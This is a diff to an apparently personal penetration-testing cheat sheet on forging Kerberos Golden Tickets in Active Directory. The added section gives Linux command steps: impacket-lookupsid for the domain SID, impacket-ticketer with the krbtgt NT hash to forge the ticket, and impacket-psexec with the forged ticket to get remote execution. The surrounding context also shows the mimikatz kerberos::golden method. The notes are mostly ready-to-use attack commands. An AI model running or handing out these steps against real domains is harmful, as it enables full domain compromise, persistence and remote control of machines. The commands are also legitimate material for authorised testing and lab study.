@@ -58,7 +58,7 @@ As a result of `CVE-2021-42287` mitigations, the ticket cannot use a non-existen
 > The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.
 
 ### Golden Ticket Creation
-#### HTB Method
+#### HTB Method(Windows)
 * Retrieve the Domain SID
 ```powershell
 Import-Module .\PowerView.ps1
@@ -76,6 +76,20 @@ kerberos::golden /domain:<domain> /user:Administrator /sid:<domain sid> /rc4:<kr
 * Use WINRM to connect
 ```powershell
 Enter-PSSession dc01
+```
+#### HTB Method(Linux)
+* Retrieve the Domain SID
+```bash
+impacket-lookupsid <domain>/<user>@<DC FQDN> -domain-sids
+```
+* Create the ticket using Ticketer.python 
+```bash
+impacket-ticketer -nthash <NT Hash> -domain-sid <domain sid> -domain <domain> <user>
+```
+* Importing and Using the ticket
+```bash
+export KRB5CCNAME=<ticket.ccache>
+impacket-psexec -k -no-pass <TARGET-HOST>
 ```
 #### Swisskey Method
 * Retrieve the Domain SID
